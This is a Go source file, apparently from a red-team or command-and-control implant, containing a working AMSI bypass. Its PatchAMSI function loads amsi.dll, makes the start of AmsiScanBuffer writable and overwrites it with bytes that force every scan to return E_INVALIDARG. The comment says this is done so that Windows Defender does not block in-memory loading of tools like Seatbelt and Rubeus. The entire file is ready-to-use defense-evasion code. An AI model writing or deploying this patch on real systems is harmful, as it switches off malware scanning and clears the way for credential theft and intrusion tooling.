//go:build windows

package hostmod

import (
	"syscall"
	"unsafe"
)

// PatchAMSI neutralizes the AMSI (Antimalware Scan Interface) by patching
// AmsiScanBuffer to return E_INVALIDARG. This prevents Windows Defender from
// blocking _AppDomain::Load_3 calls with known security tool assemblies
// (Seatbelt, Rubeus, etc.) which would otherwise fail with E_BAD_IMGFMT
// (the CLR wraps AMSI's ERROR_VIRUS_OR_THREAT into BadImageFormatException).
//
// This must be called before any CLR Assembly.Load(byte[]) operations.
func PatchAMSI() {
	amsiDLL, _ := syscall.BytePtrFromString("amsi.dll")
	hAmsi, _, _ := syscall.SyscallN(procLoadLibraryA.Addr(),
		uintptr(unsafe.Pointer(amsiDLL)))
	if hAmsi == 0 {
		return // amsi.dll not loaded — nothing to patch
	}

	scanBufName, _ := syscall.BytePtrFromString("AmsiScanBuffer")
	pScanBuf, _, _ := syscall.SyscallN(procGetProcAddress.Addr(),
		hAmsi, uintptr(unsafe.Pointer(scanBufName)))
	if pScanBuf == 0 {
		return
	}

	// Make the first 6 bytes writable.
	var oldProtect uint32
	ret, _, _ := syscall.SyscallN(procVirtualProtect.Addr(),
		pScanBuf, 6, 0x40, // PAGE_EXECUTE_READWRITE
		uintptr(unsafe.Pointer(&oldProtect)))
	if ret == 0 {
		return
	}

	// Patch: mov eax, 0x80070057; ret  →  E_INVALIDARG
	patch := [6]byte{0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3}
	for i, b := range patch {
		*(*byte)(unsafe.Pointer(pScanBuf + uintptr(i))) = b
	}

	// Restore original protection.
	syscall.SyscallN(procVirtualProtect.Addr(),
		pScanBuf, 6, uintptr(oldProtect),
		uintptr(unsafe.Pointer(&oldProtect)))
}

var (
	procLoadLibraryA   = syscall.NewLazyDLL("kernel32.dll").NewProc("LoadLibraryA")
	procGetProcAddress = syscall.NewLazyDLL("kernel32.dll").NewProc("GetProcAddress")
	procVirtualProtect = syscall.NewLazyDLL("kernel32.dll").NewProc("VirtualProtect")
)
